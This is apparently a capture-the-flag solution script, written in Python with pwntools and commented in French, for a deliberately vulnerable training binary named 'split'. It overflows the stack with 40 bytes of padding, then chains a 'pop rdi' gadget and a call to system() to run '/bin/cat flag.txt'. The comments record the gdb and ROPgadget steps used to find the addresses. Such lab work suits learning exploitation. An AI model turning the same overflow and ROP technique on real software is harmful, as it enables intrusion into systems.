from pwn import *

# But de la ROP chain :
# 1) Trouver où est stocké "/bin/cat flag.txt" dans le binaire
# 2) Charger cette adresse dans RDI à la place du "/bin/ls"
# 3) Appeler system()

context.bits = 64


pop_rdi = p64(0x4007c3)
# ROPgadget --binary ./split | grep "pop rdi"
# => 0x00000000004007c3 : pop rdi ; ret

usefulString = p64(0x601060)
# (gdb) info files
# => 0x0000000000601050 - 0x0000000000601072 is .data
# (gdb) x/22s 0x601050
# => 0x601060 <usefulString>:        "/bin/cat flag.txt"

system = p64(0x40074b)
# (gdb) disass usefulFunction
# => 0x000000000040074b <+9>:     callq  0x400560 <system@plt>

payload = b'A' * 40 + pop_rdi + usefulString + system
#    msf-pattern_create -l 500
#    (gdb) run < cyclic500.txt
#    (gdb) bt
#    msf-pattern_offset -q 0x35624134 -l 500

p = process("./split")

p.send(payload)
p.interactive()
